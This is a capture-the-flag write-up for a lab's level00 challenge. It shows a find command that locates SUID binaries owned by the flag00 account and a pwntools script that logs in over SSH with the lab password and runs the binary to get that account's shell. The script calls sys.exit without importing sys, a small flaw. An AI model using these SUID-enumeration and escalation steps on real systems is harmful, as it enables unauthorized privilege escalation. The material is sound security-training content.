> Alternatively, look at the find man page.
>
> To access this level, log in as level00 with the password of level00.

#### Solution

We just to find SUID set binaries which will run as the 'flag00' account. We can simply find them via a find command:

```
find / -type f -perm -4000 -user flag00 2>/dev/null
```

Here we got 2 binaries, let's check both of them

* `/bin/.../flag00`

* `/rofs/bin/.../flag00`

By running any of the above binary, we got the flag00's account shell.

#### Python Automation

```python
from pwn import *
from sys import argv, exit

if len(argv) < 2:
	sys.exit("IP address not found.")

session = ssh(host=argv[1], user='level00', password='level00')

terminal = session.process('/bin/.../flag00')
terminal.sendline('getflag')
terminal.interactive()
```
